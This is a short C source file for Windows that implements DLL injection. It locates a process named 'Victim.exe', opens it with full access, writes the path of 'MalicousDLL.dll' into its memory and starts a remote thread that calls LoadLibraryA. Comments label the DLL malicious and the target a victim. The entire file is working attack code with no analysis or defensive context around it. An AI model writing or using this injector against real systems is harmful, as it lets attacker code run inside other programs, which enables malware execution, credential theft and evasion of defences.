#include <Windows.h>
#include <TlHelp32.h>
#include <conio.h>
#include <stdio.h>
#include <string.h>

int main()
{
	// Path to malicious dll
	char dllPath[] = "MalicousDLL.dll";

	// get the victim's pid
	DWORD dwVictimPid = findProcessId(L"Victim.exe");

	if (dwVictimPid == 0)
		return Error();

	// open handle to the victim process
	HANDLE hVicProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwVictimPid);

	if (!hVicProc)
		return Error();

	// find LoadLibraryA function address
	HANDLE hKernel32 = GetModuleHandle(L"kernel32.dll");
	FARPROC pVicLoadLib = GetProcAddress(hKernel32, "LoadLibraryA");

	// allocate memory in the victim process and write the dll path into it
	LPVOID pVicAllocated = VirtualAllocEx(hVicProc, NULL, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	 
	if (!pVicAllocated)
		return Error();

	// write the malicious DLL path to the allocated remote memory
	if (!WriteProcessMemory(hVicProc, pVicAllocated, &dllPath, strlen(dllPath) + 1, NULL))
		Error();

	// create remote thread in the victim process
	HANDLE hRemoteThread = CreateRemoteThread(hVicProc, NULL, 0, pVicLoadLib, pVicAllocated, 0, NULL);
	
	if (!hRemoteThread)
		return Error();

	CloseHandle(hVicProc);
	printf("DLL injected.");

	return 0;
}

DWORD Error()
{
	printf("Error number %d!", GetLastError());
	_getch();
	return 0;
}

// Returns the PID of processName, or 0 if error occurred. 
DWORD findProcessId(const TCHAR* processName)
{
	// initialize PROCESS ENTRY structure
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return Error();

	if (Process32First(hProcessSnap, &procEntry) == FALSE)
	{
		CloseHandle(hProcessSnap);
		return Error();
	}

	// Iterate the process list
	while (TRUE)
	{
		if (wcscmp(procEntry.szExeFile, processName) == 0)
		{
			CloseHandle(hProcessSnap);
			return procEntry.th32ProcessID;
		}

		if (Process32Next(hProcessSnap, &procEntry) == FALSE)
		{
			CloseHandle(hProcessSnap);
			return Error();
		}
	}
}